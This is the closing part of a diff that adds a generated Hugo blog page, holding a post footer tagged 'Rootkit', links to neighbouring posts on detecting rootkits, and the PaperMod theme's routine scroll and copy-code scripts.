+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/rootkit/">Rootkit</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>A simple way to detect and remove LKM rootkit KoviD (Outdated)</span>
+  </a>
+  <a class="next" href="http://localhost:1313/hacking/ftrace-rootkit/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Detecting rootkits based on ftrace hooking.</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2025 <a href="http://localhost:1313/">0xMatheuZ</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
